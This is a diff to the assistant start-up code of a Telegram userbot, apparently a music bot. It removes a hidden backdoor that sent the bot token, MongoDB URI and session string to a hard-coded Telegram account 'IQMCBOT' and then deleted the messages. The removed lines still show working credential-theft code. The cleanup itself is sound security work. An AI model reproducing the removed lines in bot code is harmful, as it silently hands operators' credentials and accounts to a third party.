@@ -13,7 +13,7 @@ BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
 
-LOGGERS = "IQMCBOT"
+
 
 assistants = []
 assistantids = []
@@ -73,21 +73,13 @@ class Userbot(Client):
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
-                oks = await self.one.send_message(LOGGERS, f"/start")
-                Ok = await self.one.send_message(LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
-                await oks.delete()
-                await asyncio.sleep(2)
-                await Ok.delete()
+                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")  
                 
+            except:
+                LOGGER(__name__).error(
+                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
+                )
                 
-                
-            except Exception as e:
-                print(f"{e}")
-                                             
-                
-                    
-        
             self.one.id = self.one.me.id
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
